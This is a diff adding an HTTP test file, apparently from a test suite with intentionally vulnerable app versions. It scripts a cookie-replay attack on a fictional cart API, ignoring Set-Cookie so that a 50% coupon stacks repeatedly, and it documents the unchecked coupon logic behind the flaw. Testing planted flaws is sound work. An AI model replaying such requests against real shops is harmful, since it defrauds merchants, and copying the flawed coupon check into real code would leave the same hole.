@@ -1,0 +1,114 @@
+# @import ../_imports.http
+
+# GET /cart/apply-coupons vulnerability test - Session Replay Stacking (v401 ONLY)
+# CRITICAL: This tests the vulnerability that exists in v401 and MUST be excluded in v402
+#
+# The Exploit:
+# 1. User clicks shareable coupon link - cookie stores coupon
+# 2. User creates cart and adds matching item (Krabby Patty)
+# 3. User adds another item - coupon applies to Krabby Patty, price drops to $1.99
+# 4. User IGNORES Set-Cookie response header (keeps old cookie with coupon)
+# 5. User makes another cart request - coupon applies AGAIN
+# 6. Price drops further (stacking discount)
+#
+# The vulnerability: _apply_shareable_coupon() doesn't check if cart already has coupon
+
+### Step 1: Login and store session cookie
+# @name login_plankton
+{{
+  await platform.seed({ plankton: 200 });
+}}
+# @ucskip
+# @tag cart, r04, v401, vulnerable
+POST /auth/login
+Content-Type: application/json
+
+{"email": "{{user("plankton").email}}", "password": "{{user("plankton").password}}"}
+
+@session_cookie = {{extractCookie(response)}}
+?? js $(response).isOk() == true
+
+### Step 2: Click shareable coupon link - store coupon in cookie
+# @name apply_coupon
+# @forceRef login_plankton
+# @no-redirect
+# @tag cart, r04, v401, vulnerable
+GET /cart/apply-coupons?code=BURGER-50
+Cookie: {{session_cookie}}
+
+# Capture the cookie WITH the coupon - this is what we will replay
+@cookie_with_coupon = {{extractCookie(response)}}
+?? js $(response).status() == 302
+?? js hasCookie(response) == true
+
+### Step 3: Create cart for the user
+# @name create_exploit_cart
+# @forceRef apply_coupon
+# @ucskip
+# @tag cart, r04, v401, vulnerable
+POST /cart?restaurant_id=1
+Cookie: {{cookie_with_coupon}}
+
+@exploit_cart_id = {{$(response).field("cart_id")}}
+?? js $(response).status() == 201
+
+### Step 4: Add Krabby Patty - coupon NOT applied yet (no matching item in cart when checked)
+# @name add_first_item
+# @forceRef create_exploit_cart
+# @ucskip
+# @tag cart, r04, v401, vulnerable
+POST /cart/{{exploit_cart_id}}/items
+Cookie: {{cookie_with_coupon}}
+Content-Type: application/json
+
+{ "item_id": "{{menu.item("Krabby Patty").id}}" }
+
+# First item at full price - $3.99
+?? js $(response).isOk() == true
+?? js $(response).field("items")[0].price == 3.99
+
+### Step 5: Add Fries - this triggers coupon application to Krabby Patty!
+# @name add_second_item
+# @forceRef add_first_item
+# @ucskip
+# @tag cart, r04, v401, vulnerable
+POST /cart/{{exploit_cart_id}}/items
+Cookie: {{cookie_with_coupon}}
+Content-Type: application/json
+
+{ "item_id": "{{menu.item("Fries").id}}" }
+
+# Coupon applied! Krabby Patty now $1.99 (50% off $3.99)
+# Server sends Set-Cookie to remove coupon_code, but we IGNORE it
+?? js $(response).isOk() == true
+?? js $(response).field("items").find(i => i.name == "Krabby Patty").price == 1.99
+
+### Step 6: REPLAY old cookie - add empty items request
+# @name replay_attack_1
+# @forceRef add_second_item
+# @ucskip
+# @tag cart, r04, v401, vulnerable
+POST /cart/{{exploit_cart_id}}/items
+Cookie: {{cookie_with_coupon}}
+Content-Type: application/json
+
+{ }
+
+# EXPLOIT: Coupon applies AGAIN! Price drops to $0.99
+?? js $(response).isOk() == true
+?? js $(response).field("items").find(i => i.name == "Krabby Patty").price == 0.99
+
+### Step 7: REPLAY again - add another empty request
+# @name replay_attack_2
+# @forceRef replay_attack_1
+# @ucskip
+# @tag cart, r04, v401, vulnerable
+POST /cart/{{exploit_cart_id}}/items
+Cookie: {{cookie_with_coupon}}
+Content-Type: application/json
+
+{ }
+
+# EXPLOIT: Coupon applies AGAIN! Price drops to $0.49
+?? js $(response).isOk() == true
+?? js $(response).field("items").find(i => i.name == "Krabby Patty").price == 0.49
